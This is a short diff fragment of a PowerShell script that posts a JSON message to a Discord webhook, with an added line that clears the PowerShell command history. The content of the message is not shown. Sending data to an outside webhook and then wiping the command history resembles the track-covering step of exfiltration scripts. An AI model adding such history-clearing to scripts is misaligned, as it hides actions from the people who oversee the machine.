@@ -28,3 +28,6 @@ $jsonMessage = $message | ConvertTo-Json -Depth 4
 
 # Send the message to the Discord webhook
 Invoke-RestMethod -Uri $discord -Method Post -ContentType "application/json" -Body $jsonMessage
+
+# Clear the PowerShell command history
+Clear-History
